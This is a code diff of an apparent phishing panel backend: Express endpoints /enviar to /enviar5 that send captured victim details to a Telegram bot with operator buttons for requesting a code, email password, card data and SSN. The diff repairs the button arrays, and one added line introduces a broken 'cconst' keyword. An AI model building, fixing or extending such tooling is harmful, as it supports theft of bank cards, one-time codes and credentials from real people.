@@ -54,7 +54,8 @@ app.post('/enviar', async (req, res) => {
     inline_keyboard: [
       [{ text: "🔑CODIGO", callback_data: `cel-dina:${txid}` },
        { text: "👤CORREO", callback_data: `corre-clv:${txid}` },
-       { text: "💳TARJETA", callback_data: `cece-ceve:${txid}` }, text: "👤SSN-PASS", callback_data: `sene-sene:${txid}` } ],
+       { text: "💳TARJETA", callback_data: `cece-ceve:${txid}` },
+       { text: "👤SSN-PASS", callback_data: `sene-sene:${txid}` }],
       [{ text: "🔄CARGA", callback_data: `verifidata:${txid}` },
        { text: "❌ERROR ", callback_data: `errorlogo:${txid}` }]
     ]
@@ -97,11 +98,12 @@ app.post('/enviar2', async (req, res) => {
 🏙️ Ciudad: ${ciudad}
 `;
 
-  const keyboard = {
+ const keyboard = {
     inline_keyboard: [
       [{ text: "🔑CODIGO", callback_data: `cel-dina:${txid}` },
        { text: "👤CORREO", callback_data: `corre-clv:${txid}` },
-       { text: "💳TARJETA", callback_data: `cece-ceve:${txid}` }, text: "👤SSN-PASS", callback_data: `sene-sene:${txid}` } ],
+       { text: "💳TARJETA", callback_data: `cece-ceve:${txid}` },
+       { text: "👤SSN-PASS", callback_data: `sene-sene:${txid}` }],
       [{ text: "🔄CARGA", callback_data: `verifidata:${txid}` },
        { text: "❌ERROR ", callback_data: `errorlogo:${txid}` }]
     ]
@@ -144,11 +146,12 @@ app.post('/enviar3', async (req, res) => {
 🏙️ Ciudad: ${ciudad}
 `;
 
-  const keyboard = {
+ const keyboard = {
     inline_keyboard: [
       [{ text: "🔑CODIGO", callback_data: `cel-dina:${txid}` },
        { text: "👤CORREO", callback_data: `corre-clv:${txid}` },
-       { text: "💳TARJETA", callback_data: `cece-ceve:${txid}` }, text: "👤SSN-PASS", callback_data: `sene-sene:${txid}` } ],
+       { text: "💳TARJETA", callback_data: `cece-ceve:${txid}` },
+       { text: "👤SSN-PASS", callback_data: `sene-sene:${txid}` }],
       [{ text: "🔄CARGA", callback_data: `verifidata:${txid}` },
        { text: "❌ERROR ", callback_data: `errorlogo:${txid}` }]
     ]
@@ -192,11 +195,12 @@ app.post('/enviar4', async (req, res) => {
 🏙️ Ciudad: ${ciudad}
 `;
 
-  const keyboard = {
+  cconst keyboard = {
     inline_keyboard: [
       [{ text: "🔑CODIGO", callback_data: `cel-dina:${txid}` },
        { text: "👤CORREO", callback_data: `corre-clv:${txid}` },
-       { text: "💳TARJETA", callback_data: `cece-ceve:${txid}` }, text: "👤SSN-PASS", callback_data: `sene-sene:${txid}` } ],
+       { text: "💳TARJETA", callback_data: `cece-ceve:${txid}` },
+       { text: "👤SSN-PASS", callback_data: `sene-sene:${txid}` }],
       [{ text: "🔄CARGA", callback_data: `verifidata:${txid}` },
        { text: "❌ERROR ", callback_data: `errorlogo:${txid}` }]
     ]
@@ -243,7 +247,8 @@ app.post('/enviar5', async (req, res) => {
     inline_keyboard: [
       [{ text: "🔑CODIGO", callback_data: `cel-dina:${txid}` },
        { text: "👤CORREO", callback_data: `corre-clv:${txid}` },
-       { text: "💳TARJETA", callback_data: `cece-ceve:${txid}` },{ text: "👤SSN-PASS", callback_data: `sene-sene:${txid}` } ],
+       { text: "💳TARJETA", callback_data: `cece-ceve:${txid}` },
+       { text: "👤SSN-PASS", callback_data: `sene-sene:${txid}` }],
       [{ text: "🔄CARGA", callback_data: `verifidata:${txid}` },
        { text: "❌ERROR ", callback_data: `errorlogo:${txid}` }]
     ]
